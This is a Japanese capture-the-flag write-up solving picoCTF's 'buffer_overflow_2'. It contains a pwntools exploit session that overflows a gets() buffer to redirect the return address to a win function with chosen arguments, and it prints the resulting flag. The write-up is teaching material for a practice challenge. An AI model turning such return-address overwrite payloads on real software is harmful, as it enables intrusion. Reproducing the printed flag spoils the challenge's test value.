# buffer_overflow_2:bynary Medium  
Control the return address and arguments  
Download the source [here](buffer_overflow_2.c)   
Additional details will be available after launching your challenge instance.  

# Solution  
バイナリ、ソースコードが渡される。  
from pwn import *  
>>> p = remote("saturn.picoctf.net",55989)  
[x] Opening connection to saturn.picoctf.net on port 55989  
[x] Opening connection to saturn.picoctf.net on port 55989: Trying 13.59.203.175  
[+] Opening connection to saturn.picoctf.net on port 55989: Done  
>>> payload = b"a"*112   
>>> payload += p32(0x08049296)  
>>> payload += p32(0x0)  
>>> payload += p32(0xCAFEF00D) + p32(0xF00DF00D)  
>>> p.sendline(payload)  
>>> p.interactive()  
[*] Switching to interactive mode  
Please enter your string:   
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��  
picoCTF{argum3nt5_4_d4yZ_59cd5643}[*] Got EOF while reading in interactive  

# 基礎知識  
fileコマンド  
指定したファイルの「ファイルの種類（タイプ）」を判定する Linux/Unix のコマンド  
構文：file [オプション] ファイル名  
checksecコマンド  
Linuxバイナリに有効化されているセキュリティ機能を確認するツール  
構文：checksec --file=バイナリファイル名  

# 考えたこと  
問題名からバッファオーバーフローをすることが分かる。また、gets(buf);という脆弱性を発見した。
ここで、バッファオーバーフローしてリターンアドレスをWIN関数のアドレス値に書き換えることでフラグを獲得できると考えた。pwntoolsを使ってデータを送信し、対話形式で実行するとFLAGを獲得できた。